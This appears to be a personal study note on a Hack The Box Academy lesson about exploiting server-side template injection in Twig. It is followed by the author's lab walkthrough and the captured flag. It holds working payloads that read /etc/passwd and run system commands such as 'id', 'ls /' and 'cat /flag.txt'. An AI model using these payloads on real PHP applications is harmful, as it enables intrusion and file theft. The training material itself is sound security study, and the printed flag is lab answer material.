---
sticker: lucide//book-template
---

# Exploiting SSTI - Twig

In this section, we will explore another example of SSTI exploitation. In the previous section, we discussed exploiting SSTI in the `Jinja` template engine. This section will discuss exploiting SSTI in the `Twig` template engine. Like in the previous section, we will only focus on the SSTI exploitation and thus assume that the SSTI confirmation and template engine identification have already been done in a previous step. Twig is a template engine for the PHP programming language.

***

### Information Disclosure

In Twig, we can use the `_self` keyword to obtain a little information about the current template:

```twig
{{ _self }}
```

&#x20; &#x20;

![](https://academy.hackthebox.com/storage/modules/145/ssti/ssti_exploitation_2_1.png)

However, as we can see, the amount of information is limited compared to `Jinja`.

***

### Local File Inclusion (LFI)

Reading local files (without using the same way as we will use for RCE) is not possible using internal functions directly provided by Twig. However, the PHP web framework [Symfony](https://symfony.com/) defines additional Twig filters. One of these filters is [file\_excerpt](https://symfony.com/doc/current/reference/twig_reference.html#file-excerpt) and can be used to read local files:

```twig
{{ "/etc/passwd"|file_excerpt(1,-1) }}
```

&#x20; &#x20;

![](https://academy.hackthebox.com/storage/modules/145/ssti/ssti_exploitation_1_3.png)

***

### Remote Code Execution (RCE)

To achieve remote code execution, we can use a PHP built-in function such as `system`. We can pass an argument to this function by using Twig's `filter` function, resulting in any of the following SSTI payloads:

```twig
{{ ['id'] | filter('system') }}
```

&#x20; &#x20;

![](https://academy.hackthebox.com/storage/modules/145/ssti/ssti_exploitation_2_3.png)

***

### Further Remarks

This module explored exploiting SSTI in the `Jinja` and `Twig` template engines. As we have seen, the syntax of each template engine is slightly different. However, the general idea behind SSTI exploitation remains the same. Therefore, exploiting an SSTI in a template engine the attacker is unfamiliar with is often as simple as becoming familiar with the syntax and supported features of that particular template engine. An attacker can achieve this by reading the template engine's documentation. However, there are also SSTI cheat sheets that bundle payloads for popular template engines, such as the [PayloadsAllTheThings SSTI CheatSheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md).

## Question

***

!\[]\(Pasted image 20250212132712.png)

We can use the following payload to test if the page is vulnerable:

```twig
{{ _self }}
```

!\[]\(Pasted image 20250212141640.png)

Nice, let's get RCE:

```twig
{{ ['id'] | filter('system') }}
```

!\[]\(Pasted image 20250212141706.png)

Ok, let's read the `/` directory:

```twig
{{ ['ls /'] | filter('system') }}
```

!\[]\(Pasted image 20250212141749.png)

We found the flag:

```twig
{{ ['cat /flag.txt'] | filter('system') }}
```

!\[]\(Pasted image 20250212141817.png)

Flag is:

```
HTB{5034a6692604de344434ae83f1cdbec6}
```
